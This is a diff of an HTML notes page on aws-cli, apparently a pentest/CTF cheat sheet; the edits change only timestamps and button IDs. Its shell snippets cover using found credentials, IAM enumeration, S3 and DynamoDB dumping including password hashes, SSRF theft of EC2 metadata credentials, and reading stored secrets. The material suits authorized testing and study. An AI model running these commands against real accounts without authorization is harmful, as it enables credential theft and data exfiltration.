@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:16 -->
+<!-- 2026-07-30 Thu 22:27 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>aws-cli</title>
@@ -921,11 +921,11 @@ Related: <a href="20260206T060514--azure__cloud.html">Azure</a>
 <h2 id="org6beb052">Configuring Credentials</h2>
 <div class="outline-text-2" id="text-org6beb052">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f20886aedc0f42d9a5b536638c8c58fc>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7e41d7f2f8e54d8b81956b9e5659607f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f20886aedc0f42d9a5b536638c8c58fc=document.querySelector('button[name=btn_f20886aedc0f42d9a5b536638c8c58fc]');
-copyBtnbtn_f20886aedc0f42d9a5b536638c8c58fc.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Interactive setup — prompts for access key, secret key, region, output format\naws configure\n\n# Or set directly via environment variables (useful for quickly\n# testing credentials found during an engagement without persisting them)\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...   # only needed for temporary/STS credentials\n\n# Multiple credential sets — use named profiles\naws configure --profile found-creds\naws s3 ls --profile found-creds\n`);copyBtnbtn_f20886aedc0f42d9a5b536638c8c58fc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f20886aedc0f42d9a5b536638c8c58fc.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7e41d7f2f8e54d8b81956b9e5659607f=document.querySelector('button[name=btn_7e41d7f2f8e54d8b81956b9e5659607f]');
+copyBtnbtn_7e41d7f2f8e54d8b81956b9e5659607f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Interactive setup — prompts for access key, secret key, region, output format\naws configure\n\n# Or set directly via environment variables (useful for quickly\n# testing credentials found during an engagement without persisting them)\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...   # only needed for temporary/STS credentials\n\n# Multiple credential sets — use named profiles\naws configure --profile found-creds\naws s3 ls --profile found-creds\n`);copyBtnbtn_7e41d7f2f8e54d8b81956b9e5659607f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7e41d7f2f8e54d8b81956b9e5659607f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -955,11 +955,11 @@ user/role ARN, and whether the credentials even work at all.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f6ebc9d2d5694ceda858f94a016d4912>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9c34308b8ff9483e813ed6599788c11f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f6ebc9d2d5694ceda858f94a016d4912=document.querySelector('button[name=btn_f6ebc9d2d5694ceda858f94a016d4912]');
-copyBtnbtn_f6ebc9d2d5694ceda858f94a016d4912.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`aws sts get-caller-identity\n`);copyBtnbtn_f6ebc9d2d5694ceda858f94a016d4912.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f6ebc9d2d5694ceda858f94a016d4912.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9c34308b8ff9483e813ed6599788c11f=document.querySelector('button[name=btn_9c34308b8ff9483e813ed6599788c11f]');
+copyBtnbtn_9c34308b8ff9483e813ed6599788c11f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`aws sts get-caller-identity\n`);copyBtnbtn_9c34308b8ff9483e813ed6599788c11f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9c34308b8ff9483e813ed6599788c11f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -978,11 +978,11 @@ what succeeds vs. what returns <code>AccessDenied</code>.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_96dd5e5bd3a74a9384ba2e2ea7b08d92>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ff6327ee2ef84506911ce3585513da52>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_96dd5e5bd3a74a9384ba2e2ea7b08d92=document.querySelector('button[name=btn_96dd5e5bd3a74a9384ba2e2ea7b08d92]');
-copyBtnbtn_96dd5e5bd3a74a9384ba2e2ea7b08d92.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# List attached policies for the current user (if permitted)\naws iam list-attached-user-policies --user-name <username>\naws iam list-user-policies --user-name <username>\n\n# List all users, roles, and groups (broad IAM read often over-permissioned)\naws iam list-users\naws iam list-roles\n\n# Automated permission enumeration — far faster than manual guessing\n# (external tool, not part of aws-cli itself)\n# pacu, enumerate-iam.py, or ScoutSuite are the standard choices\n`);copyBtnbtn_96dd5e5bd3a74a9384ba2e2ea7b08d92.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_96dd5e5bd3a74a9384ba2e2ea7b08d92.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ff6327ee2ef84506911ce3585513da52=document.querySelector('button[name=btn_ff6327ee2ef84506911ce3585513da52]');
+copyBtnbtn_ff6327ee2ef84506911ce3585513da52.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# List attached policies for the current user (if permitted)\naws iam list-attached-user-policies --user-name <username>\naws iam list-user-policies --user-name <username>\n\n# List all users, roles, and groups (broad IAM read often over-permissioned)\naws iam list-users\naws iam list-roles\n\n# Automated permission enumeration — far faster than manual guessing\n# (external tool, not part of aws-cli itself)\n# pacu, enumerate-iam.py, or ScoutSuite are the standard choices\n`);copyBtnbtn_ff6327ee2ef84506911ce3585513da52.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ff6327ee2ef84506911ce3585513da52.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1009,11 +1009,11 @@ One of the most common findings — misconfigured bucket permissions.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0b99264358e645978f8211608df25ecf>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_45f4e3978724455b8593a0952fa380b4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0b99264358e645978f8211608df25ecf=document.querySelector('button[name=btn_0b99264358e645978f8211608df25ecf]');
-copyBtnbtn_0b99264358e645978f8211608df25ecf.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# List all buckets the credentials can see\naws s3 ls\n\n# List contents of a specific bucket\naws s3 ls s3://bucket-name\n\n# Download bucket contents\naws s3 sync s3://bucket-name ./local-dir\n\n# Test anonymous/unauthenticated access to a bucket (no credentials needed)\naws s3 ls s3://bucket-name --no-sign-request\n\n# Check a bucket's actual ACL/policy\naws s3api get-bucket-acl --bucket bucket-name\naws s3api get-bucket-policy --bucket bucket-name\n`);copyBtnbtn_0b99264358e645978f8211608df25ecf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b99264358e645978f8211608df25ecf.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_45f4e3978724455b8593a0952fa380b4=document.querySelector('button[name=btn_45f4e3978724455b8593a0952fa380b4]');
+copyBtnbtn_45f4e3978724455b8593a0952fa380b4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# List all buckets the credentials can see\naws s3 ls\n\n# List contents of a specific bucket\naws s3 ls s3://bucket-name\n\n# Download bucket contents\naws s3 sync s3://bucket-name ./local-dir\n\n# Test anonymous/unauthenticated access to a bucket (no credentials needed)\naws s3 ls s3://bucket-name --no-sign-request\n\n# Check a bucket's actual ACL/policy\naws s3api get-bucket-acl --bucket bucket-name\naws s3api get-bucket-policy --bucket bucket-name\n`);copyBtnbtn_45f4e3978724455b8593a0952fa380b4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_45f4e3978724455b8593a0952fa380b4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1047,11 +1047,11 @@ tokens) a CTF or engagement is ultimately after.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8f1d6d5d3eb44b9da1565ca51bb63ac4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_99984a0f1fa247d697a882b46335b4d5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8f1d6d5d3eb44b9da1565ca51bb63ac4=document.querySelector('button[name=btn_8f1d6d5d3eb44b9da1565ca51bb63ac4]');
-copyBtnbtn_8f1d6d5d3eb44b9da1565ca51bb63ac4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# List all tables the credentials can see\naws dynamodb list-tables\n\n# Describe a table's structure — key schema, attributes, item count\naws dynamodb describe-table --table-name <table-name>\n\n# Scan a table — dumps every item, no query condition needed\naws dynamodb scan --table-name <table-name>\n\n# Scan with a specific region if not set in default config/profile\naws dynamodb scan --table-name <table-name> --region us-east-1\n\n# Query instead of scan when you know the partition key — faster\n# and more targeted than a full scan on a large table\naws dynamodb query --table-name <table-name> \\\n  --key-condition-expression \"PK = :pk\" \\\n  --expression-attribute-values '{\":pk\": {\"S\": \"USER#admin\"}}'\n`);copyBtnbtn_8f1d6d5d3eb44b9da1565ca51bb63ac4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8f1d6d5d3eb44b9da1565ca51bb63ac4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_99984a0f1fa247d697a882b46335b4d5=document.querySelector('button[name=btn_99984a0f1fa247d697a882b46335b4d5]');
+copyBtnbtn_99984a0f1fa247d697a882b46335b4d5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# List all tables the credentials can see\naws dynamodb list-tables\n\n# Describe a table's structure — key schema, attributes, item count\naws dynamodb describe-table --table-name <table-name>\n\n# Scan a table — dumps every item, no query condition needed\naws dynamodb scan --table-name <table-name>\n\n# Scan with a specific region if not set in default config/profile\naws dynamodb scan --table-name <table-name> --region us-east-1\n\n# Query instead of scan when you know the partition key — faster\n# and more targeted than a full scan on a large table\naws dynamodb query --table-name <table-name> \\\n  --key-condition-expression \"PK = :pk\" \\\n  --expression-attribute-values '{\":pk\": {\"S\": \"USER#admin\"}}'\n`);copyBtnbtn_99984a0f1fa247d697a882b46335b4d5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_99984a0f1fa247d697a882b46335b4d5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1086,11 +1086,11 @@ this going in so the output isn't confusing:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_5eca820cf20f4421bb5231d1d045c406>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_58900066ddab4ec9a69a2332109e1b9b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_5eca820cf20f4421bb5231d1d045c406=document.querySelector('button[name=btn_5eca820cf20f4421bb5231d1d045c406]');
-copyBtnbtn_5eca820cf20f4421bb5231d1d045c406.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`{\n  \"Items\": [\n    {\n      \"username\": {\"S\": \"admin\"},\n      \"password_hash\": {\"S\": \"5f4dcc3b5aa765d61d8327deb882cf99\"},\n      \"role\": {\"S\": \"administrator\"}\n    }\n  ]\n}\n`);copyBtnbtn_5eca820cf20f4421bb5231d1d045c406.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5eca820cf20f4421bb5231d1d045c406.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_58900066ddab4ec9a69a2332109e1b9b=document.querySelector('button[name=btn_58900066ddab4ec9a69a2332109e1b9b]');
+copyBtnbtn_58900066ddab4ec9a69a2332109e1b9b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`{\n  \"Items\": [\n    {\n      \"username\": {\"S\": \"admin\"},\n      \"password_hash\": {\"S\": \"5f4dcc3b5aa765d61d8327deb882cf99\"},\n      \"role\": {\"S\": \"administrator\"}\n    }\n  ]\n}\n`);copyBtnbtn_58900066ddab4ec9a69a2332109e1b9b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_58900066ddab4ec9a69a2332109e1b9b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1112,11 +1112,11 @@ annotations for faster reading during a live engagement:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_286d340003e54402bfa1083bb1d8db77>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_40f4e95b897d4fcca3987dee5b1f0e2e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_286d340003e54402bfa1083bb1d8db77=document.querySelector('button[name=btn_286d340003e54402bfa1083bb1d8db77]');
-copyBtnbtn_286d340003e54402bfa1083bb1d8db77.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`aws dynamodb scan --table-name <table-name> --output json | \\\n  jq -r '.Items[] | \"\\(.username.S): \\(.password_hash.S)\"'\n`);copyBtnbtn_286d340003e54402bfa1083bb1d8db77.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_286d340003e54402bfa1083bb1d8db77.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_40f4e95b897d4fcca3987dee5b1f0e2e=document.querySelector('button[name=btn_40f4e95b897d4fcca3987dee5b1f0e2e]');
+copyBtnbtn_40f4e95b897d4fcca3987dee5b1f0e2e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`aws dynamodb scan --table-name <table-name> --output json | \\\n  jq -r '.Items[] | \"\\(.username.S): \\(.password_hash.S)\"'\n`);copyBtnbtn_40f4e95b897d4fcca3987dee5b1f0e2e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_40f4e95b897d4fcca3987dee5b1f0e2e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1135,11 +1135,11 @@ the first call:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_84476e9df4a64a1b8bb1f0038758f417>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2a20c07b77f248a6a878165e9ae4080c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_84476e9df4a64a1b8bb1f0038758f417=document.querySelector('button[name=btn_84476e9df4a64a1b8bb1f0038758f417]');
-copyBtnbtn_84476e9df4a64a1b8bb1f0038758f417.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Check for LastEvaluatedKey in the response — if present, more data remains\naws dynamodb scan --table-name <table-name> \\\n  --exclusive-start-key '{\"PK\": {\"S\": \"last-key-from-previous-response\"}}'\n\n# Or just use --output text and let the CLI's built-in pagination\n# handle it automatically for most cases\naws dynamodb scan --table-name <table-name> --no-paginate\n`);copyBtnbtn_84476e9df4a64a1b8bb1f0038758f417.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_84476e9df4a64a1b8bb1f0038758f417.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2a20c07b77f248a6a878165e9ae4080c=document.querySelector('button[name=btn_2a20c07b77f248a6a878165e9ae4080c]');
+copyBtnbtn_2a20c07b77f248a6a878165e9ae4080c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Check for LastEvaluatedKey in the response — if present, more data remains\naws dynamodb scan --table-name <table-name> \\\n  --exclusive-start-key '{\"PK\": {\"S\": \"last-key-from-previous-response\"}}'\n\n# Or just use --output text and let the CLI's built-in pagination\n# handle it automatically for most cases\naws dynamodb scan --table-name <table-name> --no-paginate\n`);copyBtnbtn_2a20c07b77f248a6a878165e9ae4080c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a20c07b77f248a6a878165e9ae4080c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1166,11 +1166,11 @@ targets.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a3ed4e32ebf141c38ce5f2b1f2a904a9>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1641be479ce24d3aad6c8626eb13fd94>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a3ed4e32ebf141c38ce5f2b1f2a904a9=document.querySelector('button[name=btn_a3ed4e32ebf141c38ce5f2b1f2a904a9]');
-copyBtnbtn_a3ed4e32ebf141c38ce5f2b1f2a904a9.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# From inside the exploited request (IMDSv1 — no token required)\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n# IMDSv2 requires a token first (defense against basic SSRF)\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n# The response includes AccessKeyId, SecretAccessKey, and Token —\n# export these and use aws-cli normally\n`);copyBtnbtn_a3ed4e32ebf141c38ce5f2b1f2a904a9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a3ed4e32ebf141c38ce5f2b1f2a904a9.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1641be479ce24d3aad6c8626eb13fd94=document.querySelector('button[name=btn_1641be479ce24d3aad6c8626eb13fd94]');
+copyBtnbtn_1641be479ce24d3aad6c8626eb13fd94.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# From inside the exploited request (IMDSv1 — no token required)\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n# IMDSv2 requires a token first (defense against basic SSRF)\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n# The response includes AccessKeyId, SecretAccessKey, and Token —\n# export these and use aws-cli normally\n`);copyBtnbtn_1641be479ce24d3aad6c8626eb13fd94.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1641be479ce24d3aad6c8626eb13fd94.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1199,11 +1199,11 @@ checking once any IAM read access is confirmed.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_52721a1e37c9441bb7de406b1a8956f2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_091ed9c7bb7c441f94443ce3afdf042c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_52721a1e37c9441bb7de406b1a8956f2=document.querySelector('button[name=btn_52721a1e37c9441bb7de406b1a8956f2]');
-copyBtnbtn_52721a1e37c9441bb7de406b1a8956f2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`aws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id <secret-name>\n\naws ssm describe-parameters\naws ssm get-parameter --name <parameter-name> --with-decryption\n`);copyBtnbtn_52721a1e37c9441bb7de406b1a8956f2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_52721a1e37c9441bb7de406b1a8956f2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_091ed9c7bb7c441f94443ce3afdf042c=document.querySelector('button[name=btn_091ed9c7bb7c441f94443ce3afdf042c]');
+copyBtnbtn_091ed9c7bb7c441f94443ce3afdf042c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`aws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id <secret-name>\n\naws ssm describe-parameters\naws ssm get-parameter --name <parameter-name> --with-decryption\n`);copyBtnbtn_091ed9c7bb7c441f94443ce3afdf042c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_091ed9c7bb7c441f94443ce3afdf042c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
